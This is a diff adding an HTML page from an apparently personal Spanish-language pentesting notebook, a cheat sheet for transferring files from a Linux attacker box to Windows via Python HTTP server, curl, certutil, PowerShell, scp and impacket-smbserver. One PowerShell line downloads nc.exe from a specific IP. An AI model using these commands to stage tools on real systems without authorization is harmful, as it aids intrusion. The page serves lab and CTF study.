@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Linux -> Windows | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="linux-windows">
+          <div class="note-tabbar">
+            <span>Linux -> Windows</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Transferencia de Archivos/Linux -> Windows</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">transferencia de archivos / linux a windows</p>
+            <h2>Linux -> Windows</h2>
+
+            <section class="code-card">
+              <h3>Python Server</h3>
+              <pre><code># Linux
+python -m http.server 80
+python -m SimpleHTTPServer 80
+
+# Windows curl
+curl http://ip/file.exe -o file.exe
+# Windows certutil
+certutil -urlcache -f http://ip/file.exe file.exe
+# Windows desde navegador
+http://&lt;ip_linux&gt;
+# PowerShell 1
+Invoke-WebRequest -Uri http://ip/file.exe -OutFile file.exe
+# PowerShell 1.1
+Invoke-WebRequest http://ip/file.exe -OutFile file.exe
+# PowerShell 2
+powershell.exe -c &quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://ip/file.exe&#x27;,&#x27;file.exe&#x27;)&quot;
+# PowerShell 3
+powershell -c &quot;(New-Object Net.WebClient).DownloadFile(&#x27;http://10.10.168.141:
+8080/nc.exe&#x27;,&#x27;nc.exe&#x27;)&quot;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Comando scp</h3>
+              <pre><code># Linux
+scp File.exe &lt;user&gt;@&lt;ip_window&gt;:&quot;C:\\Users\\David\\&quot;
+
+# Password: user&#x27;s password.</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>impacket-smbserver y Unidades de almacenamiento</h3>
+              <pre><code># Desde Linux
+# Abrimos servidor smb
+impacket-smbserver &lt;smbFolder&gt; $(pwd) -smb2support 
+
+# Desde Windows
+copy \\&lt;kali_ip&gt;\&lt;smbFolder&gt;\file.txt .</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>impacket-smbserver con unidades del almacenamiento</h3>
+              <pre><code># Desde Linux
+# Abrimos servidor smb
+impacket-smbserver &lt;smbFolder&gt; $(pwd) -smb2support 
+
+# Desde Windows
+# Nos conectamos al servidor smb
+net use L: \\&lt;ip_linux&gt;\&lt;smbFolder&gt; 
+# Mandamos el recurso que queramos
+copy L:\archivo.txt C:\Users\alvaro\Desktop\
+
+# Lo desmontamos
+net use L: /delete</code></pre>
+            </section>
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>transferencia_archivos</span>
+              <span>linux</span>
+              <span>windows</span>
+              <span>smb</span>
+              <span>certutil</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
